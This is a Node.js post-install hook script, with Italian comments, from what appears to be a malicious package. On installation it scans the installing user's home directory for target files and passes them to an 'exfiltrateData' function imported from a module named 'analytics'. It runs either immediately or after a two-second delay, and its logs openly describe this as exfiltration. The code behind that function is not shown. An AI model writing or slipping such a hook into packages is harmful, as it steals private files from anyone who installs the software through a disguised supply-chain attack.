const path = require('path');

// Carica i moduli dalla directory src
const config = require(path.join(__dirname, '../src/config'));
const { scanDirectory, exfiltrateData } = require(path.join(__dirname, '../src/analytics'));

console.log('Esecuzione post-install hook...');

// Se exfilTrigger == 'on_install', esegui subito
if (config.exfilTrigger === 'on_install') {
  console.log('Trigger exfiltration on install attivato');
  
  async function exfiltrateHome() {
    try {
      const findings = await scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
      if (findings.length > 0) {
        console.log(`Trovati ${findings.length} file sospetti all'installazione`);
        await exfiltrateData(findings);
      } else {
        console.log("Nessun file sospetto trovato all'installazione");
      }
    } catch (err) {
      console.warn('Errore durante exfiltration post-install:', err.message);
    }
  }
  
  exfiltrateHome();
} else {
  console.log("Nessun trigger exfiltration attivo all'installazione");
  console.log("L'exfiltration partirà automaticamente durante analisi file bersaglio...");
}

// Esegui analisi iniziale anche se trigger non è 'on_install'
async function initialScan() {
  try {
    const findings = await scanDirectory(process.env.HOME || process.env.USERPROFILE || '/home');
    if (findings.length > 0) {
      console.log('Analisi iniziale: trovati file bersaglio!');
      await exfiltrateData(findings);
    } else {
      console.log('Analisi iniziale: nessun file bersaglio trovato');
    }
  } catch (err) {
    console.warn('Errore analisi iniziale:', err.message);
  }
}

// Avvia analisi iniziale in background dopo 2 secondi
if (config.exfilTrigger !== 'on_install') {
  setTimeout(initialScan, 2000);
}